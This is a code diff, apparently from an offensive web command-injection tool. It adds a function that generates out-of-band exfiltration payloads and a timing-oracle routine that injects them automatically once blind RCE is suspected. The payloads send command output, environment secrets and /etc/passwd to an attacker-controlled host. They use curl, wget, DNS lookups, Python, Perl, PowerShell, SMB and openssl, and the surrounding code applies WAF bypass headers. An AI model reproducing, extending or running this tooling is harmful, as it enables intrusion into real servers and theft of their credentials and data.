@@ -128,6 +128,48 @@ function detectWaf(status: number, body: string): string | null {
  * HTML page content. All patterns are tested against the raw body so HTML
  * escaping cannot smuggle them past.
  */
+/**
+ * Build DNS/HTTP OOB exfiltration payloads.
+ * Triggered automatically by the adaptive timing oracle when 3+ consecutive
+ * slow responses (>5 s) occur with no direct RCE output confirmed.
+ */
+function buildDnsOobPayloads(cmd: string, attackerIp: string, attackerPort: string): string[] {
+  const host = attackerIp  || "LHOST";
+  const port = attackerPort || "9999";
+  const base = `http://${host}:${port}`;
+  const tok  = Math.random().toString(36).slice(2, 10);
+  return [
+    // HTTP OOB via curl
+    `${cmd} 2>&1 | base64 -w0 | xargs -I{} curl -sk "${base}/oob?t=${tok}&d={}" 2>/dev/null &`,
+    // HTTP OOB via wget
+    `D=$(${cmd} 2>&1 | base64 -w0); wget -qO/dev/null "${base}/oob?t=${tok}&d=$D" 2>/dev/null &`,
+    // env/secret harvest
+    `env 2>&1 | grep -iE 'pass|key|secret|token|aws|api|cred' | base64 -w0 | xargs -I{} curl -sk "${base}/env?t=${tok}&d={}" 2>/dev/null &`,
+    // whoami+hostname
+    `printf "%s@%s\\n" "$(whoami 2>/dev/null)" "$(hostname 2>/dev/null)" | base64 -w0 | xargs -I{} curl -sk "${base}/oob?t=${tok}&d={}" 2>/dev/null &`,
+    // /etc/passwd
+    `cat /etc/passwd 2>&1 | head -10 | base64 -w0 | xargs -I{} curl -sk "${base}/oob?t=${tok}&f=passwd&d={}" 2>/dev/null &`,
+    // DNS via nslookup
+    `OUT=$(${cmd} 2>&1 | base64 | tr -d '\\n=+/' | cut -c1-50); nslookup "$OUT.${tok}.${host}" 2>/dev/null; curl -sk "${base}/d?t=${tok}&d=$OUT" 2>/dev/null &`,
+    // DNS via dig
+    `OUT=$(${cmd} 2>&1 | base64 | tr -d '\\n=+/' | cut -c1-50); dig +short "$OUT.${tok}.${host}" @8.8.8.8 2>/dev/null; curl -sk "${base}/d?t=${tok}&d=$OUT" 2>/dev/null &`,
+    // chunked DNS exfil
+    `${cmd} 2>&1 | base64 -w0 | fold -w40 | awk 'BEGIN{i=0}{i++;printf "%s\\n",i"."$0}' | while IFS= read -r L; do curl -sk "${base}/c?t=${tok}&l=$L" 2>/dev/null; sleep 0.1; done &`,
+    // Python OOB fallback
+    `python3 -c "import subprocess,urllib.request,base64;o=subprocess.check_output('${cmd}',shell=True,stderr=subprocess.STDOUT);urllib.request.urlopen('${base}/oob?t=${tok}&d='+base64.b64encode(o).decode())" 2>/dev/null &`,
+    // Perl OOB fallback
+    `perl -MLWP::UserAgent -MMIME::Base64 -e 'my $o=\`${cmd} 2>&1\`;LWP::UserAgent->new->get("${base}/oob?t=${tok}&d=".encode_base64($o,""))' 2>/dev/null &`,
+    // PowerShell OOB (Windows)
+    `powershell -NoProfile -NonInteractive -c "try{$o=(&{${cmd}} 2>&1|Out-String);$e=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o));Invoke-WebRequest -Uri '${base}/oob?t=${tok}&d='+$e -UseBasicParsing}catch{}" 2>$null`,
+    // ICMP ping count as side-channel + curl OOB
+    `COUNT=$(${cmd} 2>&1 | wc -c); ping -c $COUNT -q ${host} 2>/dev/null &; curl -sk "${base}/oob?t=${tok}&d=$(${cmd} 2>&1|base64 -w0)" 2>/dev/null &`,
+    // SMB file-share callback (Windows)
+    `powershell -c "try{[System.IO.File]::WriteAllText('\\\\${host}\\share\\${tok}.txt',(&{${cmd}} 2>&1|Out-String))}catch{}" 2>$null`,
+    // OpenSSL OOB
+    `${cmd} 2>&1 | base64 -w0 | openssl s_client -quiet -connect ${host}:${port} 2>/dev/null &`,
+  ];
+}
+
 function detectCommandOutput(body: string): boolean {
   /* ── Linux / Unix ── */
   const linuxHit =
@@ -474,8 +516,9 @@ async function handleRemoteInject(
     ? buildWafSpecificHeaders(detectedWaf)
     : buildHttpBypassHeaders();
   const MAX_ATTEMPTS     = Math.min(payloadVariants.length, 60);
-  let consecutiveBlocks  = 0;
-  let consecutiveTimeouts = 0;
+  let consecutiveBlocks    = 0;
+  let consecutiveTimeouts  = 0;
+  let consecutiveSlowNoRce = 0;   // adaptive timing oracle: OOB escalation counter
 
   if (detectedWaf) {
     send(ws, { type: "data", chunk: `[STRATEGY] WAF "${detectedWaf}" detected — using targeted bypass header sets\n` });
@@ -513,16 +556,52 @@ async function handleRemoteInject(
       i, label, baselineLen, baselineBody,
     );
 
-    // ── Timing oracle: escalate on slow responses ──────────────────────────
-    if (result.elapsed > 5500 && baselineMs < 1500) {
+    // ── Adaptive Timing Oracle ─────────────────────────────────────────────
+    // Tracks consecutive slow responses. After 3+ with no direct output,
+    // automatically escalates to DNS/HTTP OOB exfiltration mode.
+    const isSlow = result.elapsed > 5000 && !result.confirmed &&
+      (baselineMs <= 0 || result.elapsed > baselineMs + 4000);
+
+    if (isSlow) {
+      consecutiveSlowNoRce++;
       const ratio = baselineMs > 0 ? (result.elapsed / baselineMs).toFixed(1) : "∞";
-      send(ws, { type: "data", chunk:
-        `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` +
-        `  Escalating timing variants for payload index ${i}\n`
-      });
-      payloadVariants.splice(i + 1, 0, ...buildTimingPayloads(10).slice(0, 5), ...buildTimingPayloads(5).slice(0, 5));
-    } else if (result.elapsed > 3500 && baselineMs < 800) {
-      send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — monitoring\n` });
+
+      if (consecutiveSlowNoRce >= 3) {
+        send(ws, { type: "data", chunk:
+          `\n  ╔═══════════════════════════════════════════════════════════════╗\n` +
+          `  ║ [TIMING ORACLE] ${consecutiveSlowNoRce} consecutive slow responses (${result.elapsed}ms)\n` +
+          `  ║ Ratio: ${ratio}x baseline — no direct output confirmed\n` +
+          `  ║ AUTO-ESCALATING → DNS/HTTP OOB EXFIL MODE\n` +
+          `  ║ Monitor your listener at ${attackerIp}:${attackerPort} for callbacks\n` +
+          `  ╚═══════════════════════════════════════════════════════════════╝\n`
+        });
+        const oobPayloads = buildDnsOobPayloads(originalCmd, attackerIp, attackerPort);
+        payloadVariants.splice(i + 1, 0, ...oobPayloads);
+        send(ws, {
+          type: "oobEscalation", mode: "dns-exfil",
+          payloadCount: oobPayloads.length,
+          callbackBase: `http://${attackerIp}:${attackerPort}`,
+          message: `Injected ${oobPayloads.length} OOB exfil payloads — watch listener at ${attackerIp}:${attackerPort}`,
+        });
+        consecutiveSlowNoRce = 0;
+      } else {
+        send(ws, { type: "data", chunk:
+          `\n  [TIMING] Slow response ${consecutiveSlowNoRce}/3: ${result.elapsed}ms ` +
+          `(baseline: ${baselineMs}ms, ratio: ${ratio}x)\n` +
+          (consecutiveSlowNoRce === 2
+            ? `  [TIMING] Next slow response triggers automatic DNS-exfil OOB escalation\n`
+            : `  [TIMING] Injecting confirmation timing payloads...\n`)
+        });
+        const confirmDelaySec = Math.min(Math.floor(result.elapsed / 1000) + 3, 14);
+        payloadVariants.splice(i + 1, 0,
+          ...buildTimingPayloads(confirmDelaySec).slice(0, 3),
+          ...buildTimingPayloads(10).slice(0, 3),
+        );
+      }
+    } else if (result.elapsed > 3000 && baselineMs > 0 && result.elapsed > baselineMs + 2000 && !result.confirmed) {
+      send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — watching\n` });
+    } else if (!result.confirmed && result.elapsed < 5000) {
+      consecutiveSlowNoRce = 0;
     }
 
     // ── RCE confirmed: stop immediately ───────────────────────────────────
